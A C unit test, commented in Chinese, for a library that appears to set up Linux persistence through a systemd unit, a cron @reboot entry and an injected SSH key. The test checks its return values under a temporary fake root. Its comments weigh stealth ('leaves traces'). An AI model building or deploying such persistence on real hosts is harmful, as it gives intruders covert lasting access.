/*
 * 覆盖 persist_linux_ensure 的"部分机制不可用"分支。
 *
 * 为何单独立一个文件：现有 test_persist.c 在开头就用 persist_sshkey_pubkey
 * 注入了真实公钥，于是 systemd/cron/sshkey 三项全能装上，ensure 在
 *     if (already == (int)nms) return 1;
 * 处即返回，永远走不到后续的返回值判定。也就是说：把那段判定改回有缺陷的
 * 旧写法，现有 54 项断言依然全绿 —— 该分支零覆盖。
 *
 * 本文件刻意**全程不注入公钥**：sshkey 的 generate 按设计返回 0（拒绝写入
 * 无法认证的占位 key，装上也无法登录，留痕且零收益），于是 sshkey 装不上，
 * already(2) < nms(3)，控制流进入被修的那一段。
 *
 * 能区分新旧写法的唯一状态是"第二次 ensure"：
 *   already=2、newly=0
 *   旧写法 return (newly > 0) ? 0 : -1  -> -1（已驻留却被判失败）
 *   新写法 按实际在位数判定                -> 1 （已驻留，幂等）
 *
 * 前提断言（sshkey 确实未装）不可省：若 sshkey 意外装上，already 会变成 3，
 * 控制流在第一行就 return 1，本文件所有断言退化为恒绿。
 */
/* setenv 属 POSIX，-std=c11 -pedantic 下 glibc 默认不暴露声明；
 * 特性宏必须在任何 include 之前定义。 */
#ifndef _POSIX_C_SOURCE
#define _POSIX_C_SOURCE 200809L
#endif
#include "persist.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

static int fails = 0, total = 0;
static void ck(const char *name, int cond) {
    total++;
    if (!cond) { fails++; printf("  FAIL: %s\n", name); }
    else printf("  ok  : %s\n", name);
}
static int exists(const char *p) { struct stat st; return stat(p, &st) == 0; }

int main(void) {
    printf("=== persist_linux_ensure：部分机制不可用 ===\n");
    setenv("HOME", "/root", 1);
    const char *root = "/tmp/persist_partial_root";
    char rmcmd[256];
    snprintf(rmcmd, sizeof rmcmd, "rm -rf %s", root);
    /* 目录可能本就不存在，故忽略 rm 退出码；但必须读取它，
     * 否则 glibc 的 warn_unused_result 会告警（(void) 抑制不住）。 */
    if (system(rmcmd) != 0) { /* 预期情况：首次运行时目录不存在 */ }
    mkdir(root, 0755);

    /* 同 test_persist.c：本文件断言 cron.d 形态，显式指定形态以免自动探测
     * 在空假根下落到 /etc/crontab 回退分支。 */
    ck("set cron impl crond", persist_set_cron_impl(PERSIST_CRON_IMPL_CROND) == 0);

    /* 前提：本进程不注入公钥，sshkey 必须生成失败 */
    char buf[4096];
    ck("前提: sshkey 未注入公钥时 generate 拒绝",
       persist_generate(PERSIST_SSHKEY, "id", buf, sizeof buf) == 0);

    /* ---- 首次：新装 systemd + cron，sshkey 失败 ---- */
    char b1[512] = {0};
    int m1[3] = {0};
    int r1 = persist_linux_ensure(root, b1, sizeof b1, m1, 3);

    ck("首次 ensure 返回 0（有新装的机制）", r1 == 0);
    ck("首次: systemd 已装", m1[0] == 1);
    ck("首次: cron 已装", m1[1] == 1);
    ck("首次: sshkey 未装（前提成立）", m1[2] == 0);
    ck("落盘副本存在", exists(b1) != 0);

    /* ---- 第二次：already=2 < nms=3 且 newly=0，新旧写法的分水岭 ---- */
    char b2[512] = {0};
    int m2[3] = {0};
    int r2 = persist_linux_ensure(root, b2, sizeof b2, m2, 3);

    ck("二次 ensure 不得返回 -1（已驻留不该判失败）", r2 != -1);
    ck("二次 ensure 返回 1（已驻留，幂等）", r2 == 1);
    ck("二次: systemd 仍在位", m2[0] == 1);
    ck("二次: cron 仍在位", m2[1] == 1);
    ck("二次: sshkey 仍未装（分水岭状态成立）", m2[2] == 0);

    /* 幂等：二次不应重复写入 */
    {
        char p[512];
        snprintf(p, sizeof p, "%s/etc/cron.d/dayanjing", root);
        FILE *f = fopen(p, "r");
        int cnt = 0;
        if (f) {
            char bb[8192];
            size_t n = fread(bb, 1, sizeof bb - 1, f);
            fclose(f);
            bb[n] = '\0';
            const char *q = bb;
            while ((q = strstr(q, "@reboot")) != NULL) { cnt++; q += 7; }
        }
        ck("二次未重复写入 cron（@reboot 恰好 1 处）", cnt == 1);
    }

    /* ---- 反向对照：三项全卸后再 ensure，应重新装回并判"新装" ---- */
    (void)persist_uninstall(PERSIST_SYSTEMD, root, NULL);
    (void)persist_uninstall(PERSIST_CRON, root, NULL);
    ck("卸载后 systemd 不在位", persist_installed(root, PERSIST_SYSTEMD) == 0);
    ck("卸载后 cron 不在位", persist_installed(root, PERSIST_CRON) == 0);
    {
        char b3[512] = {0};
        int m3[3] = {0};
        int r3 = persist_linux_ensure(root, b3, sizeof b3, m3, 3);
        ck("全卸后 ensure 返回 0（重新装回）", r3 == 0);
        ck("全卸后 systemd 重新在位", m3[0] == 1);
        ck("全卸后 cron 重新在位", m3[1] == 1);
        /* 若这里恒返回 1，说明判定退化了：卸载后重装本应有新增 */
        ck("全卸后不得返回 1（否则判定退化）", r3 != 1);
    }

    /* 目录可能本就不存在，故忽略 rm 退出码；但必须读取它，
     * 否则 glibc 的 warn_unused_result 会告警（(void) 抑制不住）。 */
    if (system(rmcmd) != 0) { /* 预期情况：首次运行时目录不存在 */ }
    printf("--- total=%d pass=%d fail=%d ---\n", total, total - fails, fails);
    return fails ? 1 : 0;
}
